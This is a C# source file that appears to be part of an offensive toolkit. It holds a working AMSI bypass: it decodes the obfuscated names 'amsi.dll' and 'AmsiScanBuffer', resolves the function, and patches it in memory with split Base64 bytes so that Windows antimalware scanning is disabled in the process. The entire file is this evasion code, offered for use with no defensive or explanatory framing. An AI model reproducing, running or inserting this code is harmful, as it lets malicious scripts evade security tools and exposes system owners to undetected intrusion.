using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Peg.ICARUS
{
	public class IMSA
	{
		public static void Abyss()
		{
			string text = "uFcA";
			text += "B4DD";
			string text2 = "uFcAB4";
			text2 += "DCGAA=";
			if (is64Bit())
			{
				PatchA(Convert.FromBase64String(text));
			}
			else
			{
				PatchA(Convert.FromBase64String(text2));
			}
		}

		private static void PatchA(byte[] patch)
		{
			try
			{
				string Name = Encoding.Default.GetString(Convert.FromBase64String("YW1zaS5kbGw="));
				IntPtr hProcess = Win32.LoadLibraryA(ref Name);
				string Name2 = Encoding.Default.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI="));
				IntPtr procAddress = Win32.GetProcAddress(hProcess, ref Name2);
				Win32.VirtualAllocEx(procAddress, (UIntPtr)(ulong)patch.Length, 64u, out var _);
				Marshal.Copy(patch, 0, procAddress, patch.Length);
			}
			catch (Exception ex)
			{
				Console.WriteLine(" [x] {0}", ex.Message);
				Console.WriteLine(" [x] {0}", ex.InnerException);
			}
		}

		private static bool is64Bit()
		{
			bool result = true;
			if (IntPtr.Size == 4)
			{
				result = false;
			}
			return result;
		}
	}
}
